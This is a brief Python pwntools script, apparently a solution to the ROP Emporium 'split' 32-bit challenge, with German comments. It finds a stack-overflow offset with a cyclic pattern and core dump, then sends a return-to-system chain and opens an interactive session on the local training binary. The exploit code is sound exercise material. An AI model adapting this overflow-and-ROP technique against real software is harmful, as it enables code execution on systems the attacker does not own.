from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge2/x32/split32'

bin= ELF(bin)
context.binary = bin
context.log_level = 'info'

p= process(bin.path)
p.sendline(cyclic(200))
p.wait_for_close()
core= p.corefile
eip= core.eip

offset= cyclic_find(eip) 
print(f"Found offset {offset} at {hex(eip)}")

system= bin.plt['system']   # 0x080483e0 alternativ direkt addresse durch rabin2 -I split32 auslesen
main= bin.symbols['main']   #sicherer return wichtig damit chain funktioniert
str= 0x0804a030
chain= flat( b'A' * offset , p32(system), p32(main), p32(str))

print(chain)

p2= process(bin.path)
p2.sendline(chain)
p2.interactive()
